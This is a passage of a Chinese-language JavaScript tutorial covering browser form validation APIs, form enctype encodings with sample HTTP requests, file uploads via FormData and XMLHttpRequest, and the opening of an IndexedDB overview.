<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myinput&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!myInput.<span class="title function_">checkValidity</span>()) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;prompt&#x27;</span>).<span class="property">innerHTML</span> = myInput.<span class="property">validationMessage</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-5-setCustomValidity"><a href="#3-5-setCustomValidity" class="headerlink" title="3.5 setCustomValidity()"></a>3.5 setCustomValidity()</h4><p>控件元素的<code>setCustomValidity()</code>方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。</p>
<p>这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;somefile.php&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">    <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">pattern</span>=<span class="string">&quot;[a-z]&#123;1,15&#125;&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用<code>setCustomValidity()</code>方法替换掉报错信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">input.<span class="property">oninvalid</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="title function_">setCustomValidity</span>(</span><br><span class="line">    <span class="string">&#x27;用户名必须是小写字母，不能为空，最长不超过15个字符&#x27;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>setCustomValidity()</code>方法是在<code>invalid</code>事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">&lt;form&gt;</span></span><br><span class="line"><span class="comment">  &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">  &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;/form&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="property">onchange</span> = checkFileSize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileSize</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> fs = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> files = fs.<span class="property">files</span>;</span><br><span class="line">  <span class="keyword">if</span> (files.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (files[<span class="number">0</span>].<span class="property">size</span> &gt; <span class="number">75</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">       fs.<span class="title function_">setCustomValidity</span>(<span class="string">&#x27;文件不能大于 75KB&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fs.<span class="title function_">setCustomValidity</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。</p>
<h4 id="3-6-validity-属性"><a href="#3-6-validity-属性" class="headerlink" title="3.6 validity 属性"></a>3.6 validity 属性</h4><p>控件元素的属性<code>validity</code>属性返回一个<code>ValidityState</code>对象，包含当前校验状态的信息。</p>
<p>该对象有以下属性，全部为只读属性。</p>
<ul>
<li><code>ValidityState.badInput</code>：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。</li>
<li><code>ValidityState.customError</code>：布尔值，表示是否已经调用<code>setCustomValidity()</code>方法，将校验信息设置为一个非空字符串。</li>
<li><code>ValidityState.patternMismatch</code>：布尔值，表示用户输入的值是否不满足模式的要求。</li>
<li><code>ValidityState.rangeOverflow</code>：布尔值，表示用户输入的值是否大于最大范围。</li>
<li><code>ValidityState.rangeUnderflow</code>：布尔值，表示用户输入的值是否小于最小范围。</li>
<li><code>ValidityState.stepMismatch</code>：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。</li>
<li><code>ValidityState.tooLong</code>：布尔值，表示用户输入的字数超出了最长字数。</li>
<li><code>ValidityState.tooShort</code>：布尔值，表示用户输入的字符少于最短字数。</li>
<li><code>ValidityState.typeMismatch</code>：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。</li>
<li><code>ValidityState.valid</code>：布尔值，表示用户是否满足所有校验条件。</li>
<li><code>ValidityState.valueMissing</code>：布尔值，表示用户没有填入必填的值。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myinput&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (input.<span class="property">validity</span>.<span class="property">valid</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;通过校验&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;校验失败&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是另外一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myInput&#x27;</span>).<span class="property">validity</span>.<span class="property">rangeOverflow</span>) &#123;</span><br><span class="line">  txt = <span class="string">&#x27;数值超过上限&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;prompt&#x27;</span>).<span class="property">innerHTML</span> = txt;</span><br></pre></td></tr></table></figure>

<p>如果想禁止浏览器弹出表单验证的报错信息，可以监听<code>invalid</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> form  = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> elem = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">elem.<span class="property">id</span>  = <span class="string">&#x27;notify&#x27;</span>;</span><br><span class="line">elem.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">form.<span class="title function_">appendChild</span>(elem);</span><br><span class="line"></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;invalid&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">if</span> (!event.<span class="property">target</span>.<span class="property">validity</span>.<span class="property">valid</span>) &#123;</span><br><span class="line">    elem.<span class="property">textContent</span>   = <span class="string">&#x27;用户名必须是小写字母&#x27;</span>;</span><br><span class="line">    elem.<span class="property">className</span>     = <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">    elem.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">    input.<span class="property">className</span>    = <span class="string">&#x27;invalid animated shake&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&#x27;block&#x27;</span> === elem.<span class="property">style</span>.<span class="property">display</span> ) &#123;</span><br><span class="line">    input.<span class="property">className</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    elem.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，一旦发生<code>invalid</code>事件（表单验证失败），<code>event.preventDefault()</code>用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。</p>
<h4 id="3-7-表单的-novalidate-属性"><a href="#3-7-表单的-novalidate-属性" class="headerlink" title="3.7 表单的 novalidate 属性"></a>3.7 表单的 novalidate 属性</h4><p>表单元素的 HTML 属性<code>novalidate</code>，可以关闭浏览器的自动校验。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个属性也可以在脚本里设置。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form.<span class="property">noValidate</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>如果表单元素没有设置<code>novalidate</code>属性，那么提交按钮（<code>或</code>元素）的<code>formnovalidate</code>属性也有同样的作用。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">formnovalidate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="4、enctype-属性"><a href="#4、enctype-属性" class="headerlink" title="4、enctype 属性"></a>4、enctype 属性</h3><p>表单能够用四种编码，向服务器发送数据。编码格式由表单的<code>enctype</code>属性决定。</p>
<p>假定表单有两个字段，分别是<code>foo</code>和<code>baz</code>，其中<code>foo</code>字段的值等于<code>bar</code>，<code>baz</code>字段的值是一个分为两行的字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>

<p>下面四种格式，都可以将这个表单发送到服务器。</p>
<p><strong>（1）GET 方法</strong></p>
<p>如果表单使用<code>GET</code>方法发送数据，<code>enctype</code>属性无效。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;register.php&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;get&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onsubmit</span>=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>数据将以 URL 的查询字符串发出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.</span><br></pre></td></tr></table></figure>

<p><strong>（2）application&#x2F;x-www-form-urlencoded</strong></p>
<p>如果表单用<code>POST</code>方法发送数据，并省略<code>enctype</code>属性，那么数据以<code>application/x-www-form-urlencoded</code>格式发送（因为这是默认值）。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;register.php&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onsubmit</span>=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送的 HTTP 请求如下。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">foo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A</span><br></pre></td></tr></table></figure>

<p>上面代码中，数据体里面的<code>%0D%0A</code>代表换行符（<code>\r\n</code>）。</p>
<p><strong>（3）text&#x2F;plain</strong></p>
<p>如果表单使用<code>POST</code>方法发送数据，<code>enctype</code>属性为<code>text/plain</code>，那么数据将以纯文本格式发送。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;register.php&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onsubmit</span>=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送的 HTTP 请求如下。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"></span><br><span class="line">foo=bar</span><br><span class="line">baz=The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>

<p><strong>（4）multipart&#x2F;form-data</strong></p>
<p>如果表单使用<code>POST</code>方法，<code>enctype</code>属性为<code>multipart/form-data</code>，那么数据将以混合的格式发送。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;register.php&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onsubmit</span>=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送的 HTTP 请求如下。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------314911788813839</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;foo&quot;</span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line">-----------------------------314911788813839</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;baz&quot;</span><br><span class="line"></span><br><span class="line">The first line.</span><br><span class="line">The second line.</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839--</span><br></pre></td></tr></table></figure>

<p>这种格式也是文件上传的格式。</p>
<h3 id="5、文件上传"><a href="#5、文件上传" class="headerlink" title="5、文件上传"></a>5、文件上传</h3><p>用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;myFile&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此外，还需要将表单<code>&lt;form&gt;</code>元素的<code>method</code>属性设为<code>POST</code>，<code>enctype</code>属性设为<code>multipart/form-data</code>。其中，<code>enctype</code>属性决定了 HTTP 头信息的<code>Content-Type</code>字段的值，默认情况下这个字段的值是<code>application/x-www-form-urlencoded</code>，但是文件上传的时候要改成<code>multipart/form-data</code>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择一个文件<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;myFile&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit_button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的 HTML 代码中，file 控件的<code>multiple</code>属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fileSelect = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> files = fileSelect.<span class="property">files</span>;</span><br></pre></td></tr></table></figure>

<p>然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> file = files[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 只上传图片文件</span></span><br><span class="line">  <span class="keyword">if</span> (!file.<span class="property">type</span>.<span class="title function_">match</span>(<span class="string">&#x27;image.*&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  formData.<span class="title function_">append</span>(<span class="string">&#x27;photos[]&#x27;</span>, file, file.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，使用 Ajax 向服务器上传文件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;handler.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">status</span> !== <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;An error occurred!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">send</span>(formData);</span><br></pre></td></tr></table></figure>

<p>除了发送 FormData 实例，也可以直接 AJAX 发送文件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test-input&#x27;</span>).<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;myserver/uploads&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, file.<span class="property">type</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(file);</span><br></pre></td></tr></table></figure>



<h2 id="十四、IndexedDB-API"><a href="#十四、IndexedDB-API" class="headerlink" title="十四、IndexedDB API"></a>十四、IndexedDB API</h2><h3 id="1、概述-5"><a href="#1、概述-5" class="headerlink" title="1、概述"></a>1、概述</h3><p>随着浏览器的功能不断增强，越来越多的网站开始考虑，将大量数据储存在客户端，这样可以减少从服务器获取数据，直接从本地获取数据。</p>
<p>现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过 4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。</p>
<p>通俗地说，IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。</p>
<p>IndexedDB 具有以下特点。</p>
<p><strong>（1）键值对储存。</strong> IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>
<p><strong>（2）异步。</strong> IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>
<p><strong>（3）支持事务。</strong> IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>
<p><strong>（4）同源限制。</strong> IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>
<p><strong>（5）储存空间大。</strong> IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>
<p><strong>（6）支持二进制储存。</strong> IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>
